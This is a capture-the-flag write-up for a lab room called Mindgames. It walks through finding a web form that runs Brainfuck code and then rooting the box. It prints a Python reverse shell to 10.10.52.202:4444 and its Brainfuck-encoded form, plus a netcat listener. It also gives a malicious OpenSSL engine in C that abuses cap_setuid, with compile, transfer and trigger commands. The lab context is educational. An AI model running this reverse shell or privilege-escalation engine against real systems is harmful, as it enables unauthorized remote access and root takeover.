# Mindgames write-up.
![room](https://user-images.githubusercontent.com/110361097/182584894-83f22081-1cbf-4aa8-afab-7ae39ffc5c1a.JPG)

HINT: No hints. Hack it. Don't give up if you get stuck, enumerate harder.

## Preparation:
Set the IP address as an environment variable in a terminal to make the process simple.

`export IP=10.10.242.185`

Access the IP variable with: $IP

## Reconnaissance:
Scan the IP address with nmap.

`nmap -A -Pn -sV -p- $IP -v -T 4`

**Result:**

![res-1](https://user-images.githubusercontent.com/110361097/182585019-1fcc6006-034d-4816-8ddb-53f77c7340b5.JPG)

So, we have ports 22 and 80 with services as ssh/web server.

## Enumeration:
Let's see what's on port 80's initial page.

`curl http://$IP -v`

**Result:**

![](/img/res-2.JPG)
![res-2](https://user-images.githubusercontent.com/110361097/182585173-f003d266-95f9-44e0-9990-8f3da077f2c8.JPG)


Possible Pivot Routes/Points Of Interest:

- /main.js
- /main.css

**Observations:**

We have references to:
* Programming
* Hello, World
* Fibonacci
* Code that contains ".-+[]<>"

This code looks familiar...

I'll assess the code sequence/pattern with a [cipher-identifier](https://www.dcode.fr/cipher-identifier)

The code has been identified as "Brainfuck".

**Info:**

Kind of makes sense since the room's name is mindgames...

We'll press on with decoding.

* Hello, World: `print("Hello, World")`
* Fibonacci:    `def F(n): if n <= 1 1: return f(n-1)+f(n-2) for i in range(10): print(f(i))`

Nothing looks interesting here. Just some standard code running on an interpreter.

Based on the initial webpage having a "Try before you buy" feature that took *trusted*
input from the user, we can assume this may be our first attack point as it would be a simple
web app using the Brainfuck code unfiltered/unsanitized as source-code input.

The code language that needs wrapping with Brainfuck is Python, this is assumed based on the "Hello, World" code that was decoded earlier.

We'll begin by generating a Python reverse shell over at: https://www.revshells.com, then encode it with Brainfuck at: https://www.splitbrain.org/_static/ook/. With this, we will try for a reverse shell first.

**The Setup:**

Python Reverse Shell: 

    import os,pty,socket;s=socket.socket();s.connect(("10.10.52.202",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")

Brainfuck wrapped:

    +++++ +++++ [->++ +++++ +++<] >++++ +.+++ +.+++ .-.++ +.++. <++++ +++++[->-- ----- --<]> ---.< +++++ +++[- >++++ ++++< ]>+++ +++++ +++++ ++.++++.<+ +++++ ++[-> ----- ---<] >---- ---.< +++++ +++[- >++++ ++++< ]>++++.+++ +.+++ ++.<+ +++++ ++[-> ----- ---<] >---- ----- ----. <++++ ++++[->+++ +++++ <]>++ +++++ .---- .<+++ [->-- -<]>- --.++ +++++ +.--- ---.<+++[- >+++< ]>+++ +++.< +++++ ++[-> ----- --<]> ----- ---.< +++++ ++[->+++++ ++<]> +++++ ++.<+ +++++ +[->- ----- -<]>- ----. <++++ +++[- >+++++++<] >++++ +.--- -.<++ +[->- --<]> ---.+ +++++ ++.-- ----. <+++[ ->+++<]>++ ++++. <++++ ++++[ ->--- ----- <]>-- ----. <++++ ++++[ ->+++ +++++<]>++ +++.- ---.< +++[- >---< ]>--- .++++ ++++. ----- -.<++ +[->+ ++<]>+++++ +.<++ +++++ +[->- ----- --<]> ----- ----- --.+. <++++ [->++ ++<]>++.<+ +++++ +[->+ +++++ +<]>+ +++++ +.<++ +++++ +[->- ----- --<]> -----.<+++ ++++[ ->+++ ++++< ]>+++ +.<++ +[->+ ++<]> +++.- ..--- ----- -.--.<++++ [->++ ++<]> +.<++ +++++ +[->- ----- --<]> ----- ----- --..- -----.<+++ [->++ +<]>+ +++++ .-.-- .+++. -.--. +++++ ++.-- -.--- -.+++ +.--.++.<+ +++[- >---- <]>.< +++[- >+++< ]>+.+ +++++ ++... .<+++ [->-- -<]>--..<+ +++[- >++++ <]>++ .<+++ ++[-> +++++ <]>++ +++++ .<+++ +[->+ +++<]>++++ .++++ .<+++ +++++ [->-- ----- -<]>- ----. <++++ +++[- >++++ +++<]>++++ +.<++ ++[-> ++++< ]>+.- ----. <++++ +++[- >---- ---<] >---- ---------. <+++[ ->--- <]>-. <++++ ++++[ ->+++ +++++ <]>++ +++++ ++++. <++++++++[ ->--- ----- <]>-- ---.< +++++ ++[-> +++++ ++<]> +++++ ++.++ +.+++.---- ---.+ +++++ +++.+ .<+++ +++++ [->-- ----- -<]>- ----- -.+.+ ++.<++++++ +[->+ +++++ +<]>+ +++++ +++.< +++++ ++[-> ----- --<]> ----- -------.<+ +++++ +[->+ +++++ +<]>+ +++++ +++++ +.+++ +++++ +.+++ .<+++ ++++++[->- ----- ---<] >-.<+ +++++ ++[-> +++++ +++<] >++++ ++.<+ +++++ ++[->----- ---<] >---- --.<+ +++++ ++[-> +++++ +++<] >++++ +++++ .++++ +.<+++++++ +[->- ----- --<]> ----- -.+++ +++++ .---- .++++ +.--- --.++ ++++.----- ----. <++++ +++[- >++++ +++<] >+++. <++++ +[->- ----< ]>--- ------.<++ +++++ [->++ +++++ <]>++ ++.++ ++.++ +++.< +++++ +++[- >---- ----<]>--- ----- ---.< +++++ +++[- >++++ ++++< ]>+++ ++.-- -.<++ +[->- --<]>----- -.<++ ++[-> ++++< ]>+++ +++.- ----- ---.< +++++ +++[- >---- ----<]>--- ---.- ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> +++++ ++<]> ++.+++++++ .++++ +.<++ +++++ [->-- ----- <]>-- ----- ----- --.<+ +++++ +[->++++++ +<]>+ +.-.< ++++[ ->+++ +<]>+ +.<++ +[->- --<]> --.<+ +++++ ++[->----- ---<] >---- --.++ +++++ .<

rlwrap listner:

`rlwrap -cAr nc -lvnp 4444`

We need to have our listener running first, then submit the wrapped code into the
"Try before you buy" submission form. 

Now submit the encoded reverse shell in the submission form with your netcat listener running and you should get the shell pop.

**Result:**

![res-4](https://user-images.githubusercontent.com/110361097/182585214-43e76183-9f44-4388-a18c-5161b0fcd2ac.JPG)


We now have shell access! Let's look for the user.txt file.

Our initial directory path is "/home/mindgames/webserver", so goto the user's home "/home/mindgames". 

Perform a directory listing and find the "user.txt" file.

![res-5](https://user-images.githubusercontent.com/110361097/182585240-7594a3d0-bc4d-495c-a7bf-e5593d3fc568.JPG)


## Flag 1:

![flag1](https://user-images.githubusercontent.com/110361097/182585255-e6e3eee9-00da-4bc5-af83-8137b7f9296d.JPG)

## Privilege Escalation:

### Target:

File: /root/root.txt

**Owned by:**

User: root

Steps:
 * Enumerate for suid/guid bit set applications by the user.
 * Modifiable dependencies/programs/files/jobs used by the target user account.
 * Readable sensitive information for the target user.
 * System or application vulnerabilities/exploits.
 * Identify possible lower level users within same target group/permissions.

Execute:

    printenv
    
    find / -perm -u=s -type f 2>/dev/null
    
Check for other interesting accounts:

![image](https://user-images.githubusercontent.com/110361097/183272929-b839fc46-35dc-43a4-9c8a-c1219a7e1c29.png)

Examine all file capabilities:

![image](https://user-images.githubusercontent.com/110361097/183272986-7646d337-479e-4a07-b365-7161ab135f9d.png)

Found suid set on openssl: 

    /usr/bin/openssl = cap_setuid+ep

Search [GTFObins](https://gtfobins.github.io/) on how to get leverage from the suid being set.

![image](https://user-images.githubusercontent.com/110361097/183273114-9d32c631-0819-47ad-9477-55648278f5cb.png)

We seem to be able to exploit "Library Load" in this circumstance.

After searching for "cap_setuid+ep" + "openssl", we find a [how to article](https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/) that walks us through the exploit. This consists of us setting up our attackbox with the required library "libssl-dev" and have "gcc" installed for compiling the exploit.

![image](https://user-images.githubusercontent.com/110361097/183274050-9374bf75-9758-498c-9067-0a2d0a53e4dd.png)

Create a file called "openssl-exploit-engine.c" with the following code:

    #include <openssl/engine.h>
    static int bind(ENGINE *e, const char *id)
    {
        setuid(0); setgid(0);
        system("/bin/bash");
    }

    IMPLEMENT_DYNAMIC_BIND_FN(bind)
    IMPLEMENT_DYNAMIC_CHECK_FN()

Compile it with the following:
    
    gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c

    gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o
    
![image](https://user-images.githubusercontent.com/110361097/183274197-1cbed828-4cdf-48e1-a8ee-206234f2ef85.png)

Now transfer "openssl-exploit-engine.so" over to the victim box.

Since the victim box has netcat on it we will use this to transfer the file.

Have the listener waiting for the file transfer on the victim machine:

    nc -lp 1234 > openssl-exploit-engine.so
    
![image](https://user-images.githubusercontent.com/110361097/183274429-5b75e657-d1be-49f5-83ac-6a10e1b5899a.png)

Now send the file over to the victim from the attackbox:

    nc -w 3 10.10.152.91 1234 < openssl-exploit-engine.so
    
![image](https://user-images.githubusercontent.com/110361097/183274437-c7ba720b-d8d4-4657-aaf7-f378adfc7a87.png)

Now on the victim box execute the following to get root:

    openssl req -engine ./openssl-exploit-engine.so
    
![image](https://user-images.githubusercontent.com/110361097/183274484-c636c2f8-4082-4860-87dc-1e75e67d7967.png)

## Flag 2:

Now we have root, read the root flag file /root/root.txt.

![image](https://user-images.githubusercontent.com/110361097/183274522-2c13b649-c3a8-4e50-8826-de7b6acbe83a.png)

